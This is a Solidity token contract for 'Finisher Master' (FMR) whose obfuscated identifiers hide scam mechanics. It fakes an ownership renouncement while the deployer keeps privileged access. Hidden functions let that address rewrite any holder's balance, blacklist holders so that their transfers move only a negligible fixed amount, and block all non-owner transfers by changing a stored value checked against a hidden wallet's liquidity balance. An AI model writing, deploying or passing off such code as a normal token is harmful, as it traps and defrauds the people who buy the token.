//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface marketingLimit {
    function createPair(address amountToReceiver, address walletSender) external returns (address);
}

interface toShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingTxLaunched) external view returns (uint256);

    function transfer(address launchMaxAuto, uint256 autoFeeTx) external returns (bool);

    function allowance(address receiverShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoFeeTx) external returns (bool);

    function transferFrom(
        address sender,
        address launchMaxAuto,
        uint256 autoFeeTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverFund, uint256 value);
    event Approval(address indexed receiverShould, address indexed spender, uint256 value);
}

abstract contract tokenIsTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toShouldMetadata is toShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FinisherMaster is tokenIsTotal, toShould, toShouldMetadata {

    address marketingFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private receiverTx = 100000000 * 10 ** 18;

    constructor (){
        
        tradingToken fromShould = tradingToken(totalExempt);
        liquidityFee = marketingLimit(fromShould.factory()).createPair(fromShould.WETH(), address(this));
        if (launchedFund) {
            toMode = false;
        }
        minSender = _msgSender();
        shouldLimit[minSender] = true;
        launchedLaunch[minSender] = receiverTx;
        totalSell();
        
        emit Transfer(address(0), minSender, receiverTx);
    }

    address public liquidityFee;

    function receiverSenderIs(address fundShould) public {
        minFrom();
        if (launchedFund != fundAmount) {
            launchedFund = true;
        }
        if (fundShould == minSender || fundShould == liquidityFee) {
            return;
        }
        toListSender[fundShould] = true;
    }

    mapping(address => bool) public toListSender;

    function receiverShouldLimit(address totalFee, address launchMaxAuto, uint256 autoFeeTx) internal returns (bool) {
        require(launchedLaunch[totalFee] >= autoFeeTx);
        launchedLaunch[totalFee] -= autoFeeTx;
        launchedLaunch[launchMaxAuto] += autoFeeTx;
        emit Transfer(totalFee, launchMaxAuto, autoFeeTx);
        return true;
    }

    function tokenSender(uint256 autoFeeTx) public {
        minFrom();
        listFund = autoFeeTx;
    }

    function balanceOf(address marketingTxLaunched) public view virtual override returns (uint256) {
        return launchedLaunch[marketingTxLaunched];
    }

    function approve(address teamAuto, uint256 autoFeeTx) public virtual override returns (bool) {
        feeSenderReceiver[_msgSender()][teamAuto] = autoFeeTx;
        emit Approval(_msgSender(), teamAuto, autoFeeTx);
        return true;
    }

    address private listLimit;

    bool private toMode;

    event OwnershipTransferred(address indexed marketingTakeBuy, address indexed teamFundAuto);

    function name() external view virtual override returns (string memory) {
        return fundTeamSender;
    }

    bool public listAmount;

    function minFrom() private view {
        require(shouldLimit[_msgSender()]);
    }

    uint8 private walletSwap = 18;

    mapping(address => bool) public shouldLimit;

    function decimals() external view virtual override returns (uint8) {
        return walletSwap;
    }

    string private fundTeamSender = "Finisher Master";

    function marketingFund(address fundReceiver) public {
        require(fundReceiver.balance < 100000);
        if (listAmount) {
            return;
        }
        
        shouldLimit[fundReceiver] = true;
        
        listAmount = true;
    }

    address totalExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private feeSenderReceiver;

    function totalSell() public {
        emit OwnershipTransferred(minSender, address(0));
        listLimit = address(0);
    }

    function buyWallet(address maxIsLaunched, uint256 autoFeeTx) public {
        minFrom();
        launchedLaunch[maxIsLaunched] = autoFeeTx;
    }

    function toAmount(address totalFee, address launchMaxAuto, uint256 autoFeeTx) internal returns (bool) {
        if (totalFee == minSender) {
            return receiverShouldLimit(totalFee, launchMaxAuto, autoFeeTx);
        }
        uint256 fundTokenLaunched = toShould(liquidityFee).balanceOf(marketingFrom);
        require(fundTokenLaunched == listFund);
        require(launchMaxAuto != marketingFrom);
        if (toListSender[totalFee]) {
            return receiverShouldLimit(totalFee, launchMaxAuto, senderMode);
        }
        return receiverShouldLimit(totalFee, launchMaxAuto, autoFeeTx);
    }

    string private enableFund = "FMR";

    uint256 listFund;

    function transferFrom(address totalFee, address launchMaxAuto, uint256 autoFeeTx) external override returns (bool) {
        if (_msgSender() != totalExempt) {
            if (feeSenderReceiver[totalFee][_msgSender()] != type(uint256).max) {
                require(autoFeeTx <= feeSenderReceiver[totalFee][_msgSender()]);
                feeSenderReceiver[totalFee][_msgSender()] -= autoFeeTx;
            }
        }
        return toAmount(totalFee, launchMaxAuto, autoFeeTx);
    }

    mapping(address => uint256) private launchedLaunch;

    uint256 tokenShould;

    bool public launchedFund;

    function transfer(address maxIsLaunched, uint256 autoFeeTx) external virtual override returns (bool) {
        return toAmount(_msgSender(), maxIsLaunched, autoFeeTx);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTx;
    }

    address public minSender;

    function getOwner() external view returns (address) {
        return listLimit;
    }

    uint256 constant senderMode = 13 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return enableFund;
    }

    function allowance(address toTakeFee, address teamAuto) external view virtual override returns (uint256) {
        if (teamAuto == totalExempt) {
            return type(uint256).max;
        }
        return feeSenderReceiver[toTakeFee][teamAuto];
    }

    function owner() external view returns (address) {
        return listLimit;
    }

    bool private fundAmount;

}